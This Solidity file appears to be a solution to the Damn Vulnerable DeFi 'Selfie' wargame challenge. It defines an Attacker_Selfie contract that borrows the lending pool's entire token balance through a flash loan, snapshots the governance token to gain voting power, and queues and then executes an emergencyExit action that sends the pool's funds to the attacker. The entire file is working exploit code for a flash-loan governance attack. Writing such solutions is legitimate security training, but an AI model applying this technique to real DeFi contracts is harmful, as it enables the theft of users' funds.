// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract Attacker_Selfie is IERC3156FlashBorrower {
    DamnValuableTokenSnapshot public dvt_token;
    SelfiePool public lending_pool;
    SimpleGovernance public governance;
    uint256 actionId;

    constructor(
        DamnValuableTokenSnapshot _token,
        SelfiePool _lending_pool,
        SimpleGovernance _governance
    ) {
        dvt_token = _token;
        lending_pool = _lending_pool;
        governance = _governance;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(msg.sender)
        );

        lending_pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(dvt_token),
            dvt_token.balanceOf(address(lending_pool)),
            data
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        uint256 id = dvt_token.snapshot();

        uint256 _actionId = governance.queueAction(
            address(lending_pool),
            0,
            data
        );

        actionId = _actionId;

        dvt_token.approve(address(lending_pool), amount);
        // Return funds to pool
        // dvt_token.transfer(address(lending_pool), amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function action() external {
        governance.executeAction(actionId);
    }
}
